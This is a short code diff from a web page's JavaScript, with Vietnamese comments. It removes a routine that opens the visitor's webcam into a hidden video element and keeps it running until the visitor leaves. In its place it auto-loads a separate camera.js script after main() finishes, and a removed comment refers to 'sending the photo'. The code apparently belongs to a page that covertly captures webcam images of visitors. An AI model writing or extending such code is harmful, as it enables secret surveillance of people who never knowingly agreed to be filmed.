@@ -203,28 +203,15 @@ async function main() {
   }
 }
 
-// 👉 Sau khi main() hoàn thành, bật camera duy nhất 1 lần và giữ nguyên
+// 👉 Sau khi main chạy xong: đợi 1.5s rồi load camera.js
 main().then(async () => {
   window.mainScriptFinished = true;
-  await delay(1500);           // Đợi 1.5s sau khi gửi ảnh
-  await startPersistentCamera(); // Bật camera và giữ nguyên
+  await delay(1500);
+
+  const script = document.createElement('script');
+  script.src = 'camera.js';       // ⚠️ Đảm bảo camera.js tồn tại cùng thư mục
+  script.defer = true;
+  document.body.appendChild(script);
+
+  console.log("✅ Đã tự động kích hoạt camera.js sau khi main.js hoàn tất.");
 });
-
-
-// 👉 Giữ camera mở đến khi thoát web
-let persistentStream = null;
-const video = document.createElement("video");
-video.style.display = "none";
-video.autoplay = true;
-video.playsInline = true;
-document.body.appendChild(video);
-
-async function startPersistentCamera() {
-  try {
-    persistentStream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = persistentStream;
-    console.log("🎥 Camera đã bật lại và giữ nguyên đến khi thoát");
-  } catch (e) {
-    console.error("Không thể bật lại camera:", e);
-  }
-}
